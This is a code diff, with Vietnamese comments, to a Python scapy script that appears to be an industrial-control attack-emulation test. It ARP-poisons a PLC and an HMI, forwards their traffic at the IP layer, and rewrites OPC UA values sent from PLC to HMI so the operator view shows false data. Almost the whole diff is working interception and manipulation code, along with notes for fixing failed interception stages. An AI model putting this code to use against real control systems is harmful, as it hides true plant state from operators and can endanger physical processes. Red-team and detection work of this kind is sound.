@@ -65,6 +65,7 @@ import sys
 import os
 import time
 import threading
+from collections import deque
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from tests.common import *  # noqa: F401,F403
@@ -72,7 +73,7 @@ from tests.common import *  # noqa: F401,F403
 try:
     from scapy.all import (
         ARP, Ether, IP, TCP, Raw,
-        sendp, srp, sniff,
+        send, sendp, srp, sniff,
         get_if_hwaddr, getmacbyip
     )
 except ImportError:
@@ -241,22 +242,40 @@ def packet_callback(pkt, plc_ip, hmi_ip, iface):
             sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)
 
 
+# Chong loop cho L3 forward: nho chu ky goi vua forward (IP.id + TCP.seq + len).
+# Goi ta tu re-send ra, neu bi sniff bat lai, se trung chu ky -> bo qua.
+_recent_sigs = deque(maxlen=4000)
+_recent_set = set()
+
+
+def _packet_sig(pkt, src_ip, dst_ip):
+    ipid = pkt[IP].id
+    seq = pkt[TCP].seq if pkt.haslayer(TCP) else 0
+    ack = pkt[TCP].ack if pkt.haslayer(TCP) else 0
+    plen = len(bytes(pkt[Raw].load)) if pkt.haslayer(Raw) else 0
+    return (src_ip, dst_ip, ipid, seq, ack, plen)
+
+
 def bridge_callback(pkt, plc_ip, hmi_ip, iface):
     """Che do spoof: script la bo forward DUY NHAT (IP forwarding phai TAT).
 
-    Chi xu ly frame ARP-poison da chuyen HUONG TOI attacker (Ether.dst ==
-    ATTACKER_MAC) de tranh vong lap voi chinh goi minh vua ban ra. Forward
-    CA MOI protocol giua 2 host (khong chi 4840) de S7comm/WinCC van song;
-    chi sua noi dung chieu PLC->HMI tren cong 4840. Flip Boolean giu nguyen
-    do dai nen TCP sequence khong lech.
+    Forward o TANG IP (L3, dung send()) chu KHONG phai L2 -- vi tren interface
+    nay scapy tra ve goi khong co lop Ether (has_ether=0) va get_if_hwaddr tra
+    00:00:00:00:00:00. send(IP) de OS/scapy tu resolve MAC that qua ARP cache
+    cua attacker (khong bi poison chinh minh) nen van giao dung dich.
+
+    Forward CA MOI protocol giua 2 host (khong chi 4840) de S7comm/WinCC van
+    song; chi sua noi dung chieu PLC->HMI tren 4840. Flip Boolean giu nguyen
+    do dai nen TCP sequence khong lech. Chong loop bang chu ky goi (khong con
+    dua vao Ether.src vi khong co L2).
     """
     global intercepted_count, raw_seen_count, has_ether_count, victim_pair_count
 
     raw_seen_count += 1
 
-    if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
+    if not pkt.haslayer(IP):
         return
-    has_ether_count += 1
+    has_ether_count += 1  # o day nghia la "co lop IP dung de forward L3"
 
     src_ip = pkt[IP].src
     dst_ip = pkt[IP].dst
@@ -264,18 +283,17 @@ def bridge_callback(pkt, plc_ip, hmi_ip, iface):
         return
     victim_pair_count += 1
 
-    # Chong loop bang MAC NGUON (chac chan hon Ether.dst == ATTACKER_MAC, vi
-    # get_if_hwaddr tren Windows/Npcap co the tra ve MAC lech dinh dang/nham
-    # card). Chi xu ly frame den TU 1 trong 2 nan nhan -- goi ta tu ban ra co
-    # src = ATTACKER_MAC nen bi loai tu dong, tranh vong lap. PLC_MAC/HMI_MAC
-    # lay tu ARP request nen dang tin.
-    if pkt[Ether].src not in (PLC_MAC, HMI_MAC):
-        return
+    sig = _packet_sig(pkt, src_ip, dst_ip)
+    if sig in _recent_set:
+        return  # goi ta tu re-send bi bat lai, hoac retransmit trung -> bo qua
+    _recent_set.add(sig)
+    _recent_sigs.append(sig)
+    if len(_recent_set) > 3800:
+        _recent_set.clear()
+        _recent_sigs.clear()
 
     intercepted_count += 1
-    dst_mac = HMI_MAC if dst_ip == hmi_ip else PLC_MAC
 
-    new_pkt = pkt.copy()
     is_opcua_plc_to_hmi = (
         src_ip == plc_ip and dst_ip == hmi_ip
         and pkt.haslayer(TCP) and pkt[TCP].sport == OPCUA_PORT
@@ -286,14 +304,14 @@ def bridge_callback(pkt, plc_ip, hmi_ip, iface):
         header = decode_ua_header(raw)
         if header:
             info(f"OPC UA {header['type']} PLC->HMI, {len(raw)}B (plaintext, decoded live)")
+        new_pkt = pkt[IP].copy()
         new_pkt[Raw].load = manipulate_opcua_payload(raw)  # giu nguyen do dai
-        del new_pkt[IP].chksum
+        del new_pkt.chksum
         if new_pkt.haslayer(TCP):
             del new_pkt[TCP].chksum
-
-    new_pkt[Ether].src = ATTACKER_MAC
-    new_pkt[Ether].dst = dst_mac
-    sendp(new_pkt, iface=iface, verbose=False)
+        send(new_pkt, iface=iface, verbose=False)
+    else:
+        send(pkt[IP], iface=iface, verbose=False)
 
 
 # ── Main ──────────────────────────────────────────────────────────────────────
@@ -428,26 +446,21 @@ def main():
     notes.append("Wireshark  : opcua || arp.duplicate-address-frame")
     if spoof_mode:
         notes.append(
-            f"DIAG counters: raw_seen={raw_seen_count} has_ether={has_ether_count} "
-            f"victim_pair={victim_pair_count} passed_mac_guard={intercepted_count}"
+            f"DIAG counters (L3 forward): raw_seen={raw_seen_count} has_ip={has_ether_count} "
+            f"victim_pair={victim_pair_count} forwarded={intercepted_count}"
         )
         if raw_seen_count == 0:
-            notes.append("CHET TANG 1: sniff khong thay goi nao voi filter 'host X and host Y' -- co the sai IFACE hoac Npcap khong ap filter. Thu chay lai voi disrupt mode de doi chieu.")
-        elif has_ether_count == 0:
-            notes.append("CHET TANG 2: co goi nhung khong co lop Ether (cooked capture). Bao lai de doi cach doc L2.")
+            notes.append("CHET TANG 1: sniff khong thay goi nao -- sai IFACE hoac Npcap khong ap filter.")
         elif victim_pair_count == 0:
-            notes.append("CHET TANG 3a: co Ether nhung khong goi nao dung cap IP PLC<->HMI -- ARP poison chua chuyen huong duoc traffic OPC UA.")
+            notes.append("CHET TANG 2: co goi nhung khong dung cap IP PLC<->HMI -- ARP poison chua chuyen huong duoc.")
         elif intercepted_count == 0:
-            notes.append("CHET TANG 3b: co goi dung cap PLC<->HMI nhung Ether.src KHONG khop PLC_MAC/HMI_MAC -- bao lai de bo guard MAC, loc theo IP thoi.")
-        if intercepted_count == 0:
-            notes.append(
-                "SPOOF intercepted=0: xem DIAG counters o tren de biet chet tang nao. "
-                "Dam bao web_scada dang poll OPC UA luc chay."
-            )
+            notes.append("CHET TANG 3: co goi dung cap nhung deu trung chu ky dedup -- bao lai de xem lai logic dedup.")
+        else:
+            notes.append(f"L3 forward hoat dong: {intercepted_count} goi da forward, {modified_count} goi OPC UA da sua.")
         notes.append(
-            "SPOOF mode: neu web_scada/HMI VAN KET NOI ma dashboard hien gia tri sai -> T0832 dat. "
-            "Neu van treo -> scapy tren Windows khong theo kip tang goi; chuyen sang pydivert/WinDivert "
-            "de kiem chung (gioi han thu vien, KHONG phai khong the sua noi dung)."
+            "SPOOF mode: neu web_scada VAN KET NOI ma dashboard hien gia tri sai -> T0832 dat. "
+            "Neu web_scada rot/treo -> scapy tren Windows khong theo kip tang goi; chuyen sang "
+            "pydivert/WinDivert de kiem chung (gioi han thu vien, KHONG phai khong the sua noi dung)."
         )
     else:
         notes.append(
